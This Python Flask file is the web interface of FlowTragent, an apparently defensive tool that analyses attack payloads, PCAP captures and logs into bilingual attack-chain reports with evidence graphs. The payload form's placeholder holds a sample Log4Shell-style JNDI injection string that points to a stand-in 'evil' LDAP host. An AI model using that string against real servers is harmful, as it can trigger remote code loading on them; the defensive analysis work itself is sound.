"""Minimal Flask UI for FlowTragent."""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path

from flask import Flask, Response, redirect, render_template_string, request, send_file, send_from_directory, url_for
from werkzeug.utils import secure_filename

from main import run_payload, run_pcap
from src.core.settings import load_config


app = Flask(__name__)
CONFIG = load_config()


PAGE = """
<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>FlowTragent</title>
  <style>
    :root {
      color-scheme: light;
      --bg: #f5f6f8;
      --panel: #ffffff;
      --line: #d9dde3;
      --line-soft: #e8ebef;
      --text: #171a1f;
      --muted: #69707a;
      --ink: #2f3338;
      --accent: #3f4752;
      --accent-hover: #222831;
      --danger: #9f2a2a;
    }
    * { box-sizing: border-box; }
    body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; color: var(--text); background: var(--bg); }
    main { max-width: 1180px; margin: 0 auto; padding: 24px; }
    header { display: flex; align-items: flex-end; justify-content: space-between; gap: 18px; padding: 18px 0 20px; border-bottom: 1px solid var(--line); }
    h1 { margin: 0; font-size: 24px; letter-spacing: 0; }
    h2 { margin: 0 0 14px; font-size: 16px; }
    p { margin: 0; }
    section { margin: 16px 0; padding: 18px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); }
    textarea { width: 100%; min-height: 136px; resize: vertical; border: 1px solid var(--line); border-radius: 6px; padding: 10px; font-family: Consolas, monospace; font-size: 13px; background: #fbfbfc; color: var(--ink); }
    input[type="text"], input[name="q"] { border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; min-width: 240px; background: #fff; }
    input[type="file"] { width: 100%; font-size: 13px; color: var(--muted); }
    button, .button { display: inline-flex; align-items: center; justify-content: center; gap: 6px; min-height: 34px; padding: 7px 12px; border: 1px solid var(--accent); background: var(--accent); color: #fff; border-radius: 6px; font-size: 14px; text-decoration: none; cursor: pointer; }
    button:hover, .button:hover { background: var(--accent-hover); text-decoration: none; }
    .button.secondary { color: var(--ink); background: #fff; border-color: var(--line); }
    .button.secondary:hover { background: #f0f2f4; }
    .button.danger, button.danger { background: #fff; color: var(--danger); border-color: #d8b8b8; }
    .button.danger:hover, button.danger:hover { background: #fff5f5; }
    a { color: #30363d; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .subtle { color: var(--muted); font-size: 13px; margin-top: 6px; }
    .grid { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 16px; }
    .checks { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; color: var(--muted); font-size: 13px; margin: 12px 0; }
    .checks input { vertical-align: middle; }
    .file-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
    .file-grid label { display: grid; gap: 7px; padding: 10px; border: 1px solid var(--line-soft); border-radius: 6px; color: var(--muted); font-size: 13px; background: #fbfbfc; }
    .result { background: #f0f2f4; border-color: #cdd2d8; display: flex; justify-content: space-between; gap: 12px; align-items: center; }
    .toolbar { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 12px; }
    .report-list { display: grid; gap: 8px; padding: 0; list-style: none; }
    .report-list li { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 11px 12px; border: 1px solid var(--line-soft); border-radius: 6px; background: #fff; }
    .report-name { overflow-wrap: anywhere; font-family: Consolas, monospace; font-size: 13px; }
    .actions { display: flex; gap: 7px; align-items: center; flex-wrap: wrap; justify-content: flex-end; }
    @media (max-width: 860px) {
      main { padding: 16px; }
      header, .grid, .file-grid, .report-list li, .result { display: block; }
      section { margin: 14px 0; }
      .file-grid label, .actions { margin-top: 10px; }
      input[type="text"], input[name="q"] { width: 100%; min-width: 0; }
    }
  </style>
</head>
<body>
<main>
  <header>
    <div>
      <h1>FlowTragent</h1>
      <p class="subtle">攻击流量输入 -> 多源证据融合 -> 中英文溯源报告</p>
    </div>
    <a class="button secondary" href="{{ url_for('index') }}">刷新</a>
  </header>

  <div class="grid">
    <section>
      <h2>Payload 分析</h2>
      <form method="post" action="/analyze-payload">
        <textarea name="payload" placeholder="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim"></textarea>
        <p class="checks">
          <label><input type="checkbox" name="demo_index" checked> demo index</label>
          <label><input type="checkbox" name="enable_rag" checked> RAG</label>
          <label><input type="checkbox" name="enable_ollama"> Ollama</label>
        </p>
        <button type="submit">生成报告</button>
      </form>
    </section>

    <section>
      <h2>PCAP + 日志分析</h2>
      <form method="post" action="/analyze-pcap" enctype="multipart/form-data">
        <div class="file-grid">
          <label>PCAP <input type="file" name="pcap" accept=".pcap,.cap,.pcapng"></label>
          <label>Access Log <input type="file" name="access_log" accept=".log,.txt,.jsonl,.csv"></label>
          <label>DNS Log <input type="file" name="dns_log" accept=".log,.txt,.jsonl,.csv"></label>
          <label>Endpoint Log <input type="file" name="endpoint_log" accept=".log,.txt,.jsonl,.csv"></label>
        </div>
        <p class="checks">
          <label><input type="checkbox" name="demo_index" checked> demo index</label>
          <label><input type="checkbox" name="enable_rag" checked> RAG</label>
          <label><input type="checkbox" name="enable_ollama"> Ollama</label>
        </p>
        <button type="submit">上传并分析</button>
      </form>
    </section>
  </div>

  {% if report %}
  <section class="result">
    <div>
      <strong>报告已生成</strong>
      <p class="subtle">{{ report.name }}</p>
    </div>
    <div class="actions">
      <a class="button" href="{{ url_for('view_report', filename=report.name, lang='zh') }}">中文查看</a>
      <a class="button secondary" href="{{ url_for('view_report', filename=report.name, lang='en') }}">English</a>
    </div>
  </section>
  {% endif %}

  <section>
    <h2>最近报告</h2>
    <form class="toolbar" method="get" action="/">
      <input name="q" value="{{ q or '' }}" placeholder="按文件名搜索报告">
      <button type="submit">搜索</button>
      <a class="button secondary" href="{{ url_for('export_reports_zip') }}">导出 ZIP</a>
    </form>
    {% if reports %}
    <ul class="report-list">
      {% for item in reports %}
      <li>
        <span class="report-name">{{ item.name }}</span>
        <span class="actions">
          <a class="button" href="{{ url_for('view_report', filename=item.name, lang='zh') }}">中文</a>
          <a class="button secondary" href="{{ url_for('view_report', filename=item.name, lang='en') }}">English</a>
          <a class="button secondary" href="{{ url_for('download_report', filename=item.name) }}">MD</a>
          {% if item.zh_name %}
          <a class="button secondary" href="{{ url_for('download_report', filename=item.zh_name) }}">中文 MD</a>
          {% endif %}
          {% if item.json_name %}
          <a class="button secondary" href="{{ url_for('download_report', filename=item.json_name) }}">JSON</a>
          {% endif %}
          <form method="post" action="{{ url_for('delete_report', filename=item.name) }}" style="display:inline;" onsubmit="return confirm('确认删除该报告的 Markdown/JSON/DOT/PNG/SVG 文件？');">
            <button class="danger" type="submit">删除</button>
          </form>
        </span>
      </li>
      {% endfor %}
    </ul>
    {% else %}
    <p class="subtle">暂无报告。</p>
    {% endif %}
  </section>
</main>
</body>
</html>
"""


REPORT_PAGE = """
<!doctype html>
<html lang="{{ 'zh-CN' if lang == 'zh' else 'en' }}">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{{ filename }} - FlowTragent</title>
  <style>
    :root {
      color-scheme: light;
      --bg: #f5f6f8;
      --panel: #ffffff;
      --line: #d9dde3;
      --line-soft: #e8ebef;
      --text: #171a1f;
      --muted: #69707a;
      --accent: #3f4752;
    }
    * { box-sizing: border-box; }
    body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; color: var(--text); background: var(--bg); }
    main { max-width: 1220px; margin: 0 auto; padding: 24px; }
    header { display: flex; justify-content: space-between; gap: 16px; align-items: center; padding: 16px 0 18px; border-bottom: 1px solid var(--line); }
    h1 { font-size: 20px; margin: 0; overflow-wrap: anywhere; }
    h2 { margin: 0 0 14px; font-size: 16px; }
    h3 { margin: 16px 0 8px; font-size: 14px; }
    section { margin: 16px 0; padding: 18px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); }
    a { color: #30363d; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .button { display: inline-flex; align-items: center; justify-content: center; min-height: 34px; padding: 7px 12px; border: 1px solid var(--line); border-radius: 6px; color: #222; background: #fff; text-decoration: none; }
    .button.active { color: #fff; border-color: var(--accent); background: var(--accent); }
    .tabs { display: flex; gap: 8px; flex-wrap: wrap; }
    .meta { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; }
    .meta div { padding: 11px; background: #f7f8fa; border: 1px solid var(--line-soft); border-radius: 6px; }
    .label { color: var(--muted); font-size: 12px; margin-bottom: 4px; }
    .graph-svg { width: 100%; min-height: 300px; border: 1px solid var(--line-soft); border-radius: 6px; background: white; }
    .mermaid-panel { overflow: auto; border: 1px solid var(--line-soft); border-radius: 6px; background: #fff; padding: 14px; }
    .mermaid { min-width: 520px; }
    details { margin-top: 12px; }
    summary { cursor: pointer; color: var(--muted); font-size: 13px; }
    pre { overflow: auto; background: #f7f8fa; border: 1px solid var(--line-soft); padding: 12px; border-radius: 6px; font-size: 12px; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th, td { border-bottom: 1px solid var(--line-soft); padding: 8px; text-align: left; vertical-align: top; }
    code { font-family: Consolas, monospace; }
    .actions { display: flex; gap: 8px; flex-wrap: wrap; }
    @media (max-width: 860px) { main { padding: 16px; } header, .meta { display: block; } .meta div, .tabs { margin-top: 10px; } }
  </style>
</head>
<body>
<main>
  <header>
    <div>
      <p><a href="{{ url_for('index') }}">{{ '返回首页' if lang == 'zh' else 'Back to home' }}</a></p>
      <h1>{{ filename }}</h1>
    </div>
    <nav class="tabs">
      <a class="button {{ 'active' if lang == 'zh' else '' }}" href="{{ url_for('view_report', filename=base_md_name, lang='zh') }}">中文</a>
      <a class="button {{ 'active' if lang == 'en' else '' }}" href="{{ url_for('view_report', filename=base_md_name, lang='en') }}">English</a>
    </nav>
  </header>

  <section class="meta">
    <div><div class="label">{{ '结论' if lang == 'zh' else 'Verdict' }}</div>{{ verdict }}</div>
    <div><div class="label">{{ '置信度' if lang == 'zh' else 'Confidence' }}</div>{{ confidence }}</div>
    <div><div class="label">Payloads</div>{{ analysis.get("payload_count", 0) }}</div>
    <div><div class="label">{{ '图谱' if lang == 'zh' else 'Graph' }}</div>{{ graph.get("nodes", [])|length }} nodes / {{ graph.get("edges", [])|length }} edges</div>
  </section>

  {% if graph.get(mermaid_key) %}
  <section>
    <h2>{{ '证据图谱' if lang == 'zh' else 'Evidence Graph' }}</h2>
    <div class="mermaid-panel">
      <div class="mermaid">
{{ graph.get(mermaid_key) }}
      </div>
    </div>
    {% if graph.get(dot_key) %}
    <h3>Graphviz SVG</h3>
    <object class="graph-svg" data="{{ url_for('graph_svg', filename=json_name, lang=lang) }}" type="image/svg+xml">
      <pre>{{ graph.get(dot_key) }}</pre>
    </object>
    {% endif %}
    <details>
      <summary>{{ '查看 Mermaid / DOT 源码' if lang == 'zh' else 'Show Mermaid / DOT source' }}</summary>
      <h3>Mermaid</h3>
      <pre>{{ graph.get(mermaid_key) }}</pre>
      <h3>Graphviz DOT</h3>
      <pre>{{ graph.get(dot_key, "") }}</pre>
    </details>
  </section>
  {% endif %}

  {% if analysis.get("attack_chain") %}
  <section>
    <h2>{{ '攻击链' if lang == 'zh' else 'Attack Chain' }}</h2>
    <table>
      <thead><tr><th>{{ '阶段' if lang == 'zh' else 'Stage' }}</th><th>{{ '技术' if lang == 'zh' else 'Technique' }}</th><th>{{ '置信度' if lang == 'zh' else 'Confidence' }}</th><th>{{ '证据' if lang == 'zh' else 'Evidence' }}</th></tr></thead>
      <tbody>
      {% for item in analysis.get("attack_chain", []) %}
      <tr>
        <td>{{ translate_stage(item.get("stage")) if lang == 'zh' else item.get("stage") }}</td>
        <td>{{ item.get("technique") }}</td>
        <td>{{ translate_confidence(item.get("confidence")) if lang == 'zh' else item.get("confidence") }}</td>
        <td><code>{{ item.get("evidence_ids", [])|join(", ") }}</code></td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </section>
  {% endif %}

  {% if graph.get("edges") %}
  <section>
    <h2>{{ '图谱边' if lang == 'zh' else 'Graph Edges' }}</h2>
    <table>
      <thead><tr><th>{{ '来源' if lang == 'zh' else 'Source' }}</th><th>{{ '关系' if lang == 'zh' else 'Relation' }}</th><th>{{ '目标' if lang == 'zh' else 'Target' }}</th><th>{{ '置信度' if lang == 'zh' else 'Confidence' }}</th><th>{{ '原因' if lang == 'zh' else 'Reason' }}</th></tr></thead>
      <tbody>
      {% for item in graph.get("edges", [])[:40] %}
      <tr>
        <td><code>{{ item.get("source_id") }}</code></td>
        <td>{{ translate_relation(item.get("relation")) if lang == 'zh' else item.get("relation") }}</td>
        <td><code>{{ item.get("target_id") }}</code></td>
        <td>{{ translate_confidence(item.get("confidence")) if lang == 'zh' else item.get("confidence") }}</td>
        <td>{{ item.get("reason") }}</td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </section>
  {% endif %}

  <section class="actions">
    <a class="button active" href="{{ url_for('download_report', filename=display_md_name) }}">{{ '下载当前 Markdown' if lang == 'zh' else 'Download current Markdown' }}</a>
    <a class="button" href="{{ url_for('download_report', filename=json_name) }}">JSON</a>
  </section>
</main>
<script type="module">
  import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";
  mermaid.initialize({
    startOnLoad: true,
    securityLevel: "loose",
    theme: "base",
    themeVariables: {
      primaryColor: "#f7f8fa",
      primaryTextColor: "#171a1f",
      primaryBorderColor: "#cfd4da",
      lineColor: "#69707a",
      secondaryColor: "#ffffff",
      tertiaryColor: "#eef0f3",
      fontFamily: "Arial, Microsoft YaHei, sans-serif"
    },
    flowchart: {
      htmlLabels: true,
      curve: "basis"
    }
  });
</script>
</body>
</html>
"""


@app.get("/")
def index():
    q = request.args.get("q", "").strip()
    return render_template_string(PAGE, report=None, reports=_recent_reports(query=q), q=q)


@app.post("/analyze-payload")
def analyze_payload():
    payload = request.form.get("payload", "").strip()
    if not payload:
        return redirect(url_for("index"))
    report = run_payload(
        payload,
        CONFIG,
        Path(CONFIG["paths"]["report_dir"]),
        int(CONFIG["retrieval"]["top_k"]),
        _checked("demo_index"),
        _checked("enable_rag"),
        _checked("enable_ollama"),
    )
    return render_template_string(PAGE, report=report, reports=_recent_reports(), q="")


@app.post("/analyze-pcap")
def analyze_pcap():
    upload = request.files.get("pcap")
    if upload is None or not upload.filename:
        return redirect(url_for("index"))
    filename = secure_filename(upload.filename)
    pcap_path = Path(CONFIG["paths"]["pcap_dir"]) / filename
    pcap_path.parent.mkdir(parents=True, exist_ok=True)
    upload.save(pcap_path)

    uploaded_logs = _save_optional_logs()
    report = run_pcap(
        pcap_path,
        CONFIG,
        Path(CONFIG["paths"]["report_dir"]),
        int(CONFIG["retrieval"]["top_k"]),
        _checked("demo_index"),
        _checked("enable_rag"),
        _checked("enable_ollama"),
        access_logs=uploaded_logs["access_log"],
        dns_logs=uploaded_logs["dns_log"],
        endpoint_logs=uploaded_logs["endpoint_log"],
    )
    return render_template_string(PAGE, report=report, reports=_recent_reports(), q="")


@app.get("/view-report/<path:filename>")
def view_report(filename: str):
    lang = "zh" if request.args.get("lang") == "zh" else "en"
    safe_name = secure_filename(filename)
    if not safe_name.endswith(".md"):
        return redirect(url_for("index"))
    report_dir = Path(CONFIG["paths"]["report_dir"])
    base_md_name = _base_md_name(safe_name)
    json_path = report_dir / base_md_name.replace(".md", ".json")
    if not json_path.exists():
        return redirect(url_for("download_report", filename=safe_name))
    analysis = json.loads(json_path.read_text(encoding="utf-8"))
    impact = analysis.get("impact_assessment") or {}
    display_md_name = _localized_md_name(base_md_name, lang)
    return render_template_string(
        REPORT_PAGE,
        filename=display_md_name,
        display_md_name=display_md_name,
        base_md_name=base_md_name,
        json_name=json_path.name,
        analysis=analysis,
        impact=impact,
        verdict=_impact_verdict(impact, lang),
        confidence=_confidence_label(impact.get("confidence"), lang),
        graph=analysis.get("evidence_graph") or {},
        lang=lang,
        mermaid_key="mermaid_zh" if lang == "zh" else "mermaid",
        dot_key="dot_zh" if lang == "zh" else "dot",
        translate_relation=_relation_label,
        translate_confidence=lambda value: _confidence_label(value, "zh"),
        translate_stage=_stage_label,
    )


@app.get("/reports/<path:filename>")
def download_report(filename: str):
    return send_from_directory(CONFIG["paths"]["report_dir"], secure_filename(filename), as_attachment=False)


@app.post("/delete-report/<path:filename>")
def delete_report(filename: str):
    safe_name = secure_filename(filename)
    report_dir = Path(CONFIG["paths"]["report_dir"])
    base = Path(_base_md_name(safe_name)).stem
    for suffix in (".md", "_zh.md", ".json", ".dot", "_zh.dot", ".png", ".svg"):
        target = report_dir / f"{base}{suffix}"
        if target.exists() and target.resolve().parent == report_dir.resolve():
            target.unlink()
    return redirect(url_for("index"))


@app.get("/export-reports.zip")
def export_reports_zip():
    report_dir = Path(CONFIG["paths"]["report_dir"])
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
    tmp.close()
    with zipfile.ZipFile(tmp.name, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(report_dir.glob("flowtragent_report_*.*")):
            if path.suffix.lower() in {".md", ".json", ".dot", ".png", ".svg"}:
                archive.write(path, arcname=path.name)
    return send_file(tmp.name, mimetype="application/zip", as_attachment=True, download_name="flowtragent_reports.zip")


@app.get("/graph-svg/<path:filename>")
def graph_svg(filename: str):
    lang = "zh" if request.args.get("lang") == "zh" else "en"
    safe_name = secure_filename(filename)
    json_path = Path(CONFIG["paths"]["report_dir"]) / safe_name
    if not json_path.exists():
        return Response("Report JSON not found.", status=404, mimetype="text/plain")
    analysis = json.loads(json_path.read_text(encoding="utf-8"))
    dot_key = "dot_zh" if lang == "zh" else "dot"
    dot_text = (analysis.get("evidence_graph") or {}).get(dot_key) or (analysis.get("evidence_graph") or {}).get("dot")
    if not dot_text:
        return Response("Report does not contain evidence_graph.dot.", status=404, mimetype="text/plain")
    dot_bin = shutil.which("dot")
    if not dot_bin:
        return Response(dot_text, status=200, mimetype="text/plain")
    with tempfile.TemporaryDirectory() as tmp_dir:
        dot_path = Path(tmp_dir) / "graph.dot"
        svg_path = Path(tmp_dir) / "graph.svg"
        dot_path.write_text(dot_text, encoding="utf-8")
        subprocess.run([dot_bin, "-Tsvg", str(dot_path), "-o", str(svg_path)], check=True)
        return Response(svg_path.read_text(encoding="utf-8"), mimetype="image/svg+xml")


def _checked(name: str) -> bool:
    return request.form.get(name) == "on"


def _recent_reports(limit: int = 12, query: str = "") -> list[dict[str, str]]:
    report_dir = Path(CONFIG["paths"]["report_dir"])
    if not report_dir.exists():
        return []
    reports = [
        path
        for path in sorted(report_dir.glob("*.md"), key=lambda item: item.stat().st_mtime, reverse=True)
        if not path.stem.endswith("_zh")
    ]
    if query:
        reports = [path for path in reports if query.lower() in path.name.lower()]
    items = []
    for path in reports[:limit]:
        zh_path = path.with_name(f"{path.stem}_zh.md")
        json_path = path.with_suffix(".json")
        items.append(
            {
                "name": path.name,
                "zh_name": zh_path.name if zh_path.exists() else "",
                "json_name": json_path.name if json_path.exists() else "",
            }
        )
    return items


def _save_optional_logs() -> dict[str, list[str]]:
    saved = {"access_log": [], "dns_log": [], "endpoint_log": []}
    upload_dir = Path(CONFIG["paths"]["csv_dir"]) / "uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    for field in saved:
        upload = request.files.get(field)
        if upload is None or not upload.filename:
            continue
        filename = secure_filename(upload.filename)
        path = upload_dir / f"{field}_{filename}"
        upload.save(path)
        saved[field].append(str(path))
    return saved


def _base_md_name(filename: str) -> str:
    path = Path(filename)
    if path.stem.endswith("_zh"):
        return f"{path.stem[:-3]}.md"
    return path.name


def _localized_md_name(base_md_name: str, lang: str) -> str:
    path = Path(base_md_name)
    return f"{path.stem}_zh.md" if lang == "zh" else path.name


def _impact_verdict(impact: dict, lang: str) -> str:
    verdict = impact.get("verdict", "Insufficient evidence")
    if lang != "zh":
        return verdict
    return {
        "Likely successful exploitation with C2 indicators": "疑似成功利用并伴随 C2 通信迹象",
        "Possible successful exploitation with C2 indicators": "可能成功利用并伴随 C2 通信迹象",
        "Possible compromise with C2 indicators": "可能存在失陷并伴随 C2 通信迹象",
        "Likely successful exploitation": "疑似成功利用",
        "Possible successful exploitation": "可能成功利用",
        "Likely exploitation attempt with successful HTTP response": "疑似漏洞利用尝试且收到成功 HTTP 响应",
        "Likely exploitation attempt": "疑似漏洞利用尝试",
        "Possible exploitation attempt": "可能的漏洞利用尝试",
        "Reconnaissance or probing": "侦察或探测行为",
        "Insufficient evidence": "证据不足",
    }.get(verdict, verdict)


def _confidence_label(value: str | None, lang: str) -> str:
    if lang != "zh":
        return value or "low"
    return {"high": "高", "medium": "中", "low": "低"}.get(str(value or "").lower(), value or "低")


def _stage_label(value: str | None) -> str:
    return {
        "Reconnaissance": "侦察",
        "Exploitation": "漏洞利用",
        "Command Execution": "命令执行",
        "Payload Delivery": "载荷投递",
        "C2": "C2 通信",
        "Persistence": "持久化",
        "Impact": "影响",
    }.get(value or "", value or "")


def _relation_label(value: str | None) -> str:
    relation = value or ""
    mapping = {
        "same_asset": "同一资产",
        "temporal_sequence": "时间顺序",
        "process_external_connection": "进程外联",
        "process_to_network_destination": "进程到网络目的地",
        "dns_context_for_process": "DNS 与进程上下文",
    }
    if relation.startswith("c2_sequence:"):
        return relation.replace("c2_sequence:", "C2 通信序列:")
    if relation.startswith("same_stage:"):
        return relation.replace("same_stage:", "同一攻击阶段:")
    return mapping.get(relation, relation)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
